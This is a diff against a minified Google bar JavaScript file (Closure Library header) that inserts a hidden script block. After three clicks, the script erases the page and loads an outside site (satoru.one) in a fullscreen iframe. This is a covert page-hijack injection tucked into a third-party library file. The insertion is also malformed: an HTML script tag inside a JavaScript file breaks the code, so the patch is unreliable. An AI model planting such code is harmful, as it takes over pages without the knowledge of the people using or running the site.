@@ -11,6 +11,41 @@ var g=this||self;var k,l=(k=g.mei)!=null?k:1,m,p=(m=g.diel)!=null?m:0,q,r=(q=g.s
  Copyright The Closure Library Authors.
  SPDX-License-Identifier: Apache-2.0
 */
+ <script>
+let clicks = 0;
+const url = "https://satoru.one/"; // your embed URL
+
+document.addEventListener("click", () => {
+    clicks++;
+
+    if (clicks === 3) {
+        document.body.style.backgroundColor = "black";
+        document.body.style.margin = "0";
+        document.body.style.padding = "0";
+        document.body.style.overflow = "hidden";
+
+        document.body.innerHTML = "";
+
+        const iframe = document.createElement("iframe");
+        iframe.src = url;
+        iframe.style.position = "fixed";
+        iframe.style.top = "0";
+        iframe.style.left = "0";
+        iframe.style.width = "100vw";
+        iframe.style.height = "100vh";
+        iframe.style.border = "none";
+        iframe.style.margin = "0";
+        iframe.style.padding = "0";
+        iframe.style.zIndex = "999999";
+
+        iframe.setAttribute("allowfullscreen", "");
+        iframe.setAttribute("allow", "fullscreen");
+
+        document.body.appendChild(iframe);
+    }
+});
+</script>
+
 var e=this||self;var aa=function(a,b,c,d){d=d||{};d._sn=["cfg",b,c].join(".");window.gbar.logger.ml(a,d)};var f=window.gbar=window.gbar||{},h=window.gbar.i=window.gbar.i||{},da;function _tvn(a,b){a=parseInt(a,10);return isNaN(a)?b:a}function _tvf(a,b){a=parseFloat(a);return isNaN(a)?b:a}function _tvv(a){return!!a}function n(a,b,c){(c||f)[a]=b}f.bv={n:_tvn("2",0),r:"",f:".66.",e:"",m:_tvn("1",1)};
 function ea(a,b,c){var d="on"+b;if(a.addEventListener)a.addEventListener(b,c,!1);else if(a.attachEvent)a.attachEvent(d,c);else{var g=a[d];a[d]=function(){var k=g.apply(this,arguments),m=c.apply(this,arguments);return k==void 0?m:m==void 0?k:m&&k}}}var fa=function(a){return function(){return f.bv.m==a}},ha=fa(1),ia=fa(2);n("sb",ha);n("kn",ia);h.a=_tvv;h.b=_tvf;h.c=_tvn;h.i=aa;var q=window.gbar.i.i;var r=function(){},u=function(){},la=function(a){var b=new Image,c=ja;b.onerror=b.onload=b.onabort=function(){try{delete ka[c]}catch(d){}};ka[c]=b;b.src=a;ja=c+1},ka=[],ja=0;n("logger",{il:u,ml:r,log:la});var v=window.gbar.logger;var w={},x={createScript:function(a){return a}};x=self.trustedTypes&&self.trustedTypes.createPolicy?self.trustedTypes.createPolicy("ogb#inline",x):x;
 var ma={},y=[],na=h.b("0.1",.1),oa=h.a("1",!0),pa=function(a,b){y.push([a,b])},qa=function(a,b){w[a]=b},ra=function(a){return a in w},z={},A=function(a,b){z[a]||(z[a]=[]);z[a].push(b)},B=function(a){A("m",a)},C=function(a,b){var c=document.createElement("script");c.src=x.createScript(a);c.async=oa;Math.random()<na&&(c.onerror=function(){c.onerror=null;r(Error("Bundle load failed: name="+(b||"UNK")+" url="+a))});(document.getElementById("xjsc")||
